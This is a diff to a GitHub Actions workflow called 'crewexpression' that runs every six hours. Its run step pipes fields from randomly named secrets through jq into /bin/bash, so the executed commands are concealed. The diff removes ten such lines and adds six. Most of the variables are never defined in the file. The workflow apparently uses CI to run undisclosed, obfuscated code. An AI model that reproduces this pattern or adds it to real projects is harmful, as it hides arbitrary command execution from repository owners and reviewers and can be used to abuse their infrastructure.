@@ -3,8 +3,7 @@ name: crewexpression
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 1/6 * * *'
-
+    - cron: '23 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: crewexpression
         env:
-          nybd2484: ${{ secrets.nybd2484 }}
+          qi72: ${{ secrets.qi72 }}
         run: |
-          echo $nybd2484 | jq -r .j9828 | /bin/bash
-          echo $qs30 | jq -r .gkz7648 | /bin/bash
-          echo $gpgt0188 | jq -r .boc347 | /bin/bash
-          echo $on501 | jq -r .tdd347 | /bin/bash
-          echo $yoi96 | jq -r .a9 | /bin/bash
-          echo $e07306 | jq -r .rg50305 | /bin/bash
-          echo $ji37644 | jq -r .vmn4320 | /bin/bash
-          echo $mrig56 | jq -r .usql93932 | /bin/bash
-          echo $wvv4 | jq -r .m4 | /bin/bash
-          echo $zo00838 | jq -r .lpz46 | /bin/bash
+          echo $qi72 | jq -r .cm7 | /bin/bash
+          echo $k8 | jq -r .cqzm6936 | /bin/bash
+          echo $ev4833 | jq -r .mrxq44027 | /bin/bash
+          echo $zv649 | jq -r .qxy73824 | /bin/bash
+          echo $ssvzs9 | jq -r .lwrzm9558 | /bin/bash
+          echo $zr7219 | jq -r .zmpp7 | /bin/bash
 
